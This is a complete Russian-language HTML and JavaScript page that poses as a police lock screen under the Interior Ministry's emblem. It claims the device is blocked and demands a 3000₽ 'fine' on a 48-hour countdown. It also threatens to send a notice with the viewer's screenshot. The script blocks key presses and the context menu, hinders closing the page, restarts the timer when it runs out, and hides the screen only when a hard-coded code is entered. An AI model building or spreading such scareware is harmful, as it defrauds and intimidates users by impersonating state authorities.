<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ваше устройство заблокировано</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            text-align: center;
            background: black;
            color: white;
            overflow: hidden;
        }
        #lockScreen {
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: fixed;
            top: 0;
            left: 0;
            background: black;
            z-index: 9999;
        }
        h1 {
            color: red;
            font-size: 28px;
        }
        #timer {
            font-size: 26px;
            margin-top: 10px;
            color: yellow;
            font-weight: bold;
        }
        .warning {
            font-size: 18px;
            max-width: 600px;
            margin-top: 20px;
            text-align: left;
            background: rgba(255, 0, 0, 0.2);
            padding: 10px;
            border-radius: 10px;
            border: 2px solid red;
        }
        input {
            padding: 10px;
            font-size: 18px;
            text-align: center;
            margin-top: 20px;
            border: none;
            border-radius: 5px;
        }
        img {
            width: 150px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body oncontextmenu="return false;" onkeydown="return false;" onbeforeunload="return confirmExit()">

    <div id="lockScreen">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7f/Emblem_of_the_Ministry_of_Internal_Affairs.svg/1280px-Emblem_of_the_Ministry_of_Internal_Affairs.svg.png" alt="MVD Logo">
        <h1>ВАШЕ УСТРОЙСТВО ЗАБЛОКИРОВАНО</h1>
        <p>Оставшееся время: <span id="timer">48:00:00</span></p>
        <p>Оплата штрафа: <strong>3000₽</strong> (удваивается через 24 часа)</p>

        <div class="warning">
            ⚠ При попытке выключения устройства штраф увеличивается, а после 48 часов будет отправлено уведомление от имени КНБ РФ с вашим скриншотом.
        </div>

        <input type="password" id="password" placeholder="Введите код разблокировки">
    </div>

    <script>
        let timeLeft = 48 * 60 * 60; // 48 часов в секундах
        let shutdownAttempts = 0;

        function updateTimer() {
            let hours = Math.floor(timeLeft / 3600);
            let minutes = Math.floor((timeLeft % 3600) / 60);
            let seconds = timeLeft % 60;

            document.getElementById("timer").innerText = 
                String(hours).padStart(2, "0") + ":" + 
                String(minutes).padStart(2, "0") + ":" + 
                String(seconds).padStart(2, "0");

            if (timeLeft <= 0) {
                timeLeft = 48 * 60 * 60; // Новый таймер на 48 часов
            }
            timeLeft--;
        }

        function confirmExit() {
            shutdownAttempts++;
            if (shutdownAttempts > 2) {
                timeLeft -= 3600; // -1 час за попытку выключения
            }
            return "";
        }

        document.getElementById("password").addEventListener("input", function() {
            if (this.value === "85748") {
                document.getElementById("lockScreen").style.display = "none";
            }
        });

        setInterval(updateTimer, 1000);
    </script>

</body>
</html>
